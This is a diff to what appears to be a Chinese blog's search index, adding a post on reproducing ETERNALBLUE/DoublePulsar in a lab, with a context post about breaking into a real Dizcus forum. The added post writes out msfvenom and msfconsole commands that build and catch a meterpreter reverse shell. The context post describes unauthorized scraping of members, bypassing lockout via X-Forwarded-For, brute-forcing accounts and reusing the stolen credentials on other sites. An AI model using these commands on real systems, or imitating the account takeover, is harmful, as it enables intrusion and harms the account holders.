@@ -3,6 +3,13 @@
   
     
     <entry>
+      <title><![CDATA[2017 Equation Group 0day]]></title>
+      <url>%2F2017%2F04%2F22%2Fequation-group-0day-2017%2F</url>
+      <content type="text"><![CDATA[概述Shadow Brokers黑客组织上周泄露了NSA方程式组织的一些工具，其中某些工具客直接拿下Windows服务器。 安装 下载安装 python-2.6.6.msi,pywin32-221.win32-py2.6.exe 。 下载解压 shadowbroker 。 在 shadowbroker 的 windows 目录下新建 listeningposts 目录。 ETERNALBLUE实验环境攻击机1 win7 64 旗舰版 python-2.6.6.msi pywin32-221.win32-py2.6.exe shadowbroker IP : 192.168.111.155 攻击机2 kali 2016.2 IP : 192.168.111.144 靶机 win2008 IP : 192.168.111.158 systeminfo 信息如下： 复现过程初始化配置，创建一个攻击项目。 使用 ETERNALBLUE 模块。 使用 DoublePulsar 模块。 DoublePulsar是一个后门程序，用于在已感染的系统上注入和运行恶意代码。这是一种NSA用作监听使用的后门程序，如今在GitHub上得到免费发布后，任何人均可使用。其软件是在Windows XP到Server 2008 R2系统版本中的计算机上，通过使用EternalBlue Exploit的SMB文件共享服务端口启动旧版本下的远程执行代码RCE，随后进行程序的安装。也就是说，会受到攻击影响的计算机系统是存在漏洞的Windows版本，因为这给攻击者提供了其SMB端口。 这里要选择SMB和对应的目标操作系统位数下面的话是攻击的4个操作 选择RunDLL。 这里用攻击机2 kali的msfvenom 生成一下dll 这里使用的是reverse_tcp的paylaod 可以根据网络情况采用其他payload 1$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.108.144 LPORT=5555 -f dll &gt; s.dll 把生成的s.dll传到攻击机1上去， 然后kali开启msfconsole 监听，下面的payload要和上面msfvenom的payload对应起来 123456$ msfconsole msf &gt; use exploit/multi/handler msf &gt; set LHOST 192.168.108.131 msf &gt; set LPORT 5555 msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp msf &gt; exploit 然后操作fb.py ，加载s.dll。 kali 收到反弹的shell 。 总结当然，还有其他的攻击模块，下次在更新。]]></content>
+    </entry>
+
+    
+    <entry>
       <title><![CDATA[Dizcus Pentest]]></title>
       <url>%2F2017%2F04%2F04%2Fdizcus-pentest%2F</url>
       <content type="text"><![CDATA[概述某次看大佬们聊天时聊到某个站，于是赶紧上去看看，要交50元会员费，吾等穷人怎么交的会员费嘛。 过程看看下这个站，并没找到什么能getshell的办法，好气啊。只能想想其他思路了。偶然发现可以查看其他人的个人资料以及交的会员费等详情。于是搞了个python脚本爬了下所有交了会员费的用户。 发现用户登录的地方没有验证码限制，但是有登陆错误次数限制。 可以确定这个网站用户登录的地方的登陆限制是通过IP和用户名一起的，意思是同一个ip或者同一个用户只能错误登陆5次，之后便锁定了。 IP可以用X-Forwarded-For绕过，但是用户名没办法。 既然这样的话，那就试下用户名和密码一样的吧，看看这样能不能得到一些信息。 由于之前爬下来的账户显示的是昵称，假如没有昵称就显示用户名，这里刚好可以利用这点进行BurpSuite爆破。 OK，发现还是得到了一些用户的信息，试了下，可以登录，发现还不少。 当然，登陆之后还能看到用户邮箱的一些信息，进行了一下社工，部分账号可以登录12306等网站。 后来发现这种方式可以针对大部分的dizcus进行利用。 总结技术还是有所欠缺，还是得继续学习。]]></content>
